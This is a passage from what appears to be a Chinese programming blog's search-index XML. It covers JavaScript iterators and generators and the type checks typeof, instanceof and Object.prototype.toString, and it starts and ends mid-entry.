class="language-javascript"><span class="language-xml">        <span class="variable language_">this</span>.$emit(<span class="string">&quot;input&quot;</span>, newVal)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探讨 Symbol-iterator 迭代器</title>
      <link href="/2019/12/4127d3f5fd3b.html"/>
      <url>/2019/12/4127d3f5fd3b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-何为-Symbol-iterator"><a href="#1-何为-Symbol-iterator" class="headerlink" title="1. 何为 Symbol-iterator"></a>1. 何为 Symbol-iterator</h1><blockquote><p>Symbol.iterator 为每一个对象定义了默认的迭代器。该迭代器可以被 for…of 循环使用。</p></blockquote><p>ES6 定义了 <code>for...of</code> 方法，可以用来遍历数组的值，其用法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>实际上 <code>for...of</code> 循环首先会向被访问的对象请求一个 <strong>迭代器对象</strong> ，然后通过调用迭代器对象的 <code>next()</code> 方法来遍历所有返回值。所谓的迭代器对象，就是指数组上本身所内置的 <code>@@iterator</code> ，我们可以通过访问数组的 <code>Symbol.iterator</code> 属性来取到该迭代器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>];</span><br><span class="line">arr[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] <span class="comment">// [Function: values]</span></span><br></pre></td></tr></table></figure><p>我们可以利用其进行手动遍历数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> it = arr[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;b&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;c&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(it.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><p>以下对象都内置了迭代器，也就是说他们可以直接使用 <code>for...of</code> 循环：</p><ul><li>Array.prototype<a href="">@@iterator</a></li><li>TypedArray.prototype<a href="">@@iterator</a></li><li>String.prototype<a href="">@@iterator</a></li><li>Map.prototype<a href="">@@iterator</a></li><li>Set.prototype<a href="">@@iterator</a></li></ul><p>此外，ES6 的展开运算符也是基于迭代器实现的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...a]) <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h1 id="2-迭代器的实现"><a href="#2-迭代器的实现" class="headerlink" title="2. 迭代器的实现"></a>2. 迭代器的实现</h1><p>对于一个普通的 Object 来说，由于其没有内置迭代器所以不能使用 <code>for...of</code> 循环，但是我们只要手动为其挂载上一个迭代器方法，并让其返回一个 <code>next()</code> 方法，每次调用 <code>next()</code> 方法是都返回一个包含 <code>value</code> 与 <code>done</code> 属相的对象，也可以实现对普通对象的 <code>for...of</code> 循环：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&quot;c&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="title class_">Symbol</span>.<span class="property">iterator</span>, &#123;</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">value</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> o = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(o);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">next</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          <span class="attr">value</span>: o[keys[index++]],</span><br><span class="line">          <span class="attr">done</span>: index &gt; keys.<span class="property">length</span></span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> obj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...obj])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">[ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ]</span><br></pre></td></tr></table></figure><p>顺带一提，迭代器每一步返回的过程是不是与 Generator 十分相似，我们先来复习一下 Generator 函数的操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">generatorFn</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">0</span></span><br><span class="line">  <span class="keyword">yield</span> a++;</span><br><span class="line">  <span class="keyword">yield</span> a++;</span><br><span class="line">  <span class="keyword">yield</span> a++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ge = <span class="title function_">generatorFn</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ge.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 0, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ge.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ge.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ge.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><p>所以利用 Generator 可以更加便捷的实现迭代器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&quot;c&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj2, <span class="title class_">Symbol</span>.<span class="property">iterator</span>, &#123;</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">value</span>: <span class="keyword">function</span>*() &#123;</span><br><span class="line">    <span class="keyword">let</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="comment">// 注意 yeild 在这里只能使用 for 循环遍历，而不能使用 yield</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">yield</span> <span class="variable language_">this</span>[keys[i]];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 你不知道的Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述Javascript的类型判断</title>
      <link href="/2019/12/42b69b73d990.html"/>
      <url>/2019/12/42b69b73d990.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-typeof"><a href="#1-typeof" class="headerlink" title="1. typeof"></a>1. typeof</h1><p>typeof 是 Javascript 的一个操作符，可以表示未经计算的操作数的类型。</p><p>如下是摘录自 MDN 的 <code>typeof</code> 可能输出的值的列表：</p><table><thead><tr><th>类型</th><th>结果</th></tr></thead><tbody><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Undefined">Undefined</a></td><td><code>&quot;undefined&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Null">Null</a></td><td><code>&quot;object&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Boolean">Boolean</a></td><td><code>&quot;boolean&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Number">Number</a></td><td><code>&quot;number&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/BigInt">BigInt</a></td><td><code>&quot;bigint&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/String">String</a></td><td><code>&quot;string&quot;</code></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Symbol">Symbol</a> (ECMAScript 2015 新增)</td><td><code>&quot;symbol&quot;</code></td></tr><tr><td>宿主对象（由 JS 环境提供）</td><td><em>取决于具体实现</em></td></tr><tr><td><a href="https://developer.mozilla.org/en-US/docs/Glossary/Function">Function</a> 对象 (按照 ECMA-262 规范实现 [[Call]])</td><td><code>&quot;function&quot;</code></td></tr><tr><td>其他任何对象</td><td><code>&quot;object&quot;</code></td></tr></tbody></table><p>使用 <code>typeof</code> 时要特别注意以下两个非预想的结果：</p><ul><li><code>typeof null</code> 输出为 “object”</li><li><code>typeof NaN</code> 输出为 “number” (NaN：Not-A-Number)</li></ul><p>此外 MDN 附加了以下 <code>typeof</code> 的诡异特性，在此进行摘录：</p><h3 id="null"><a href="#null" class="headerlink" title="null"></a><code>null</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// JavaScript 诞生以来便如此</span><br><span class="line">typeof null === &#x27;object&#x27;;</span><br></pre></td></tr></table></figure><p>在 JavaScript 最初的实现中，JavaScript 中的值是由一个表示类型的标签和实际数据值表示的。对象的类型标签是 0。由于 <code>null</code> 代表的是空指针（大多数平台下值为 0x00），因此，null 的类型标签是 0，<code>typeof null</code> 也因此返回 <code>&quot;object&quot;</code>。（<a href="http://www.2ality.com/2013/10/typeof-null.html">参考来源</a>）</p><p>曾有一个 ECMAScript 的修复提案（通过选择性加入的方式），但<a href="http://wiki.ecmascript.org/doku.php?id=harmony:typeof_null">被拒绝了</a>。该提案会导致 <code>typeof null === &#39;null&#39;</code>。</p><h3 id="使用-new-操作符"><a href="#使用-new-操作符" class="headerlink" title="使用 new 操作符"></a>使用 <code>new</code> 操作符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 除 Function 外的所有构造函数的类型都是 &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;String&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> num = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> str; <span class="comment">// 返回 &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> num; <span class="comment">// 返回 &#x27;object&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">Function</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> func; <span class="comment">// 返回 &#x27;function&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="语法中的括号"><a href="#语法中的括号" class="headerlink" title="语法中的括号"></a>语法中的括号</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 括号有无将决定表达式的类型。</span></span><br><span class="line"><span class="keyword">var</span> iData = <span class="number">99</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> iData + <span class="string">&#x27; Wisen&#x27;</span>; <span class="comment">// &#x27;number Wisen&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> (iData + <span class="string">&#x27; Wisen&#x27;</span>); <span class="comment">// &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>对正则表达式字面量的类型判断在某些浏览器中不符合标准：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> /s/ === <span class="string">&#x27;function&#x27;</span>; <span class="comment">// Chrome 1-12 , 不符合 ECMAScript 5.1</span></span><br><span class="line"><span class="keyword">typeof</span> /s/ === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// Firefox 5+ , 符合 ECMAScript 5.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><p>在 ECMAScript 2015 之前，<code>typeof</code> 总能保证对任何所给的操作数返回一个字符串。即便是没有声明的标识符，<code>typeof</code> 也能返回 <code>&#39;undefined&#39;</code>。使用 <code>typeof</code> 永远不会抛出错误。</p><p>但在加入了块级作用域的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/let">let</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/const">const</a> 之后，在其被声明之前对块中的 <code>let</code> 和 <code>const</code> 变量使用 <code>typeof</code> 会抛出一个  <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError">ReferenceError</a>。块作用域变量在块的头部处于“<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/let#Temporal_Dead_Zone_and_errors_with_let">暂存死区</a>”，直至其被初始化，在这期间，访问变量将会引发错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> undeclaredVariable === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> newLetVariable; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">typeof</span> newConstVariable; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">typeof</span> newClass; <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> newLetVariable;</span><br><span class="line"><span class="keyword">const</span> newConstVariable = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">newClass</span>&#123;&#125;;</span><br></pre></td></tr></table></figure><h3 id="例外"><a href="#例外" class="headerlink" title="例外"></a>例外</h3><p>当前所有的浏览器都暴露了一个类型为 <code>undefined</code> 的非标准宿主对象 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/all" title="Document 接口上的一个只读属性。返回一个 HTMLAllCollection，包含了页面上的所有元素。"><code>document.all</code></a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="variable language_">document</span>.<span class="property">all</span> === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尽管规范允许为非标准的外来对象自定义类型标签，但它要求这些类型标签与已有的不同。<code>document.all</code> 的类型标签为 <code>&#39;undefined&#39;</code> 的例子在 Web 领域中被归类为对原 ECMA JavaScript 标准的“故意侵犯”。</p><h1 id="2-instanceof"><a href="#2-instanceof" class="headerlink" title="2. instanceof"></a>2. instanceof</h1><p>instanceof 运算符用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上，换句话说，instanceof 可以帮助我们来判断一个对象是否是否继承与另一个对象。</p><h3 id="内部原理"><a href="#内部原理" class="headerlink" title="内部原理"></a>内部原理</h3><p>其实这里可以看一下 <code>instanceof</code> 运算符代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">instance_of</span>(<span class="params">L, R</span>) &#123;<span class="comment">//L 表示左表达式，R 表示右表达式</span></span><br><span class="line"> <span class="keyword">var</span> O = R.<span class="property"><span class="keyword">prototype</span></span>;<span class="comment">// 取 R 的显示原型</span></span><br><span class="line"> L = L.<span class="property">__proto__</span>;<span class="comment">// 取 L 的隐式原型</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="literal">true</span>) &#123; </span><br><span class="line">   <span class="keyword">if</span> (L === <span class="literal">null</span>) </span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">   <span class="keyword">if</span> (O === L)<span class="comment">// 这里重点：当 O 严格等于 L 时，返回 true </span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">   L = L.<span class="property">__proto__</span>; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很容易发现，<code>instance_of</code> 方法取出了右边对象 R 的 <code>prototype</code> 属性，然后使用了 <code>while</code> 循环一层一层的去调出左边对象 L 的 <code>__proto__</code> 隐式原型，按照原型链的调用规则，如果 L 继承与 R ，那 L 在某一层的隐式原型一定与 R 的显示原型完全相等。</p><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span> <span class="keyword">instanceof</span> <span class="title class_">Number</span>);<span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">String</span> <span class="keyword">instanceof</span> <span class="title class_">String</span>);<span class="comment">//false </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span>);<span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span> <span class="keyword">instanceof</span> <span class="title class_">Foo</span>);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span> <span class="keyword">instanceof</span> <span class="title class_">Function</span>);<span class="comment">//true </span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span>);<span class="comment">//true </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span> <span class="keyword">instanceof</span> <span class="title class_">Function</span>);<span class="comment">//true </span></span><br></pre></td></tr></table></figure><p>上面第一组的解析我们很容易就能明白，因为一个对象本身的隐式原型与其显示原型不相等，那么肯定返回 <code>false</code>；第二组，Foo 函数构造于 <code>Function</code> 这是一个很标准的原型继承；而第三组似乎有些特殊，但是仔细看一下原型继承图我们就很容易看明白，对于 Object 来说 <code>Object.__proto__.proto__ === Object.prototype</code>，对于 Function 来说 <code>Function.__proto__ === Function.prototype</code>。</p><p><a href="!http://markdown.img.esunr.xyz/20191109222853.png"></a></p><h3 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h3><p>对于字面量而非对象的元素，不可以使用 instanceof 来判断类型，因为其本身并非是 Object，因此会出现如下的情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">123</span></span><br><span class="line">num <span class="keyword">instanceof</span> <span class="title class_">Number</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;string&quot;</span></span><br><span class="line">str <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">123</span>)</span><br><span class="line"><span class="keyword">typeof</span> num <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line">num <span class="keyword">instanceof</span> <span class="title class_">Number</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;string&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> str <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line">str <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>但有趣的一点是，我们直接对比变量的隐式原型，其指向的正是这些内置对象的显式原型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;string&quot;</span></span><br><span class="line">str.<span class="property">__proto__</span> === <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>按照 instance 的判断规则，可以判断出 <code>str instanceof String</code> 返回结果是 <code>true</code>，因此说明其底层对字面量元素进行了屏蔽，使其直接返回了 false 。因此对于字面量的 Number 或者 String，只能使用 typeof 来判断或者 <code>Object.prototype.toString()</code> 来判断。</p><h1 id="3-Object-prototype-toString"><a href="#3-Object-prototype-toString" class="headerlink" title="3.Object.prototype.toString()"></a>3.Object.prototype.toString()</h1><h3 id="被改写的-toString"><a href="#被改写的-toString" class="headerlink" title="被改写的 toString()"></a>被改写的 toString()</h3><p>由于 Object 对象的原型上挂载了一个 <code>toString()</code> 方法，因此根据原型链的调用规则，在 Javascript 中每个对象都可以调用 <code>toString()</code> 方法，其本身原意为返回一个表示该对象的字符串。</p><p>我们可以通过创建一个对象来调用该方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">toString</span>()) <span class="comment">// &#x27;[object Object]&#x27;</span></span><br></pre></td></tr></table></figure><p>但是当我们调用 Number 类型或者 Array 类型时，其结果为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num.<span class="title function_">toString</span>()); <span class="comment">// &#x27;123&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].<span class="title function_">toString</span>()); <span class="comment">// &#x27;1,2,3&#x27;</span></span><br></pre></td></tr></table></figure><p>这是由于在 <code>Number.prototype</code> 与 <code>Array.prototype</code> 上已经改写了 <code>toString()</code> 方法，<code>123.toString()</code> 执行的其实是 <code>Number.prototype.toString()</code> 而并非 <code>Object.prototype.toString()</code>。对于大部分的 Javascript 内建类型来说，都改写了 <code>toString()</code> 方法，用户自行创建的构造函数也可以通过在 <code>prototype</code> 上挂载 <code>toString()</code> 方法达到改写的目的。以下的表格列举了常见的类型对象调用 <code>toString()</code> 方法所输出的结果：</p><table><thead><tr><th>数据类型</th><th>例子</th><th>return</th></tr></thead><tbody><tr><td>字符串</td><td>“foo”.toString()</td><td>“foo”</td></tr><tr><td>数字</td><td>1.toString()</td><td>Uncaught SyntaxError: Invalid or unexpected token</td></tr><tr><td>布尔值</td><td>false.toString()</td><td>“false”</td></tr><tr><td>undefined</td><td>undefined.toString()</td><td>Uncaught TypeError: Cannot read property ‘toString’ of 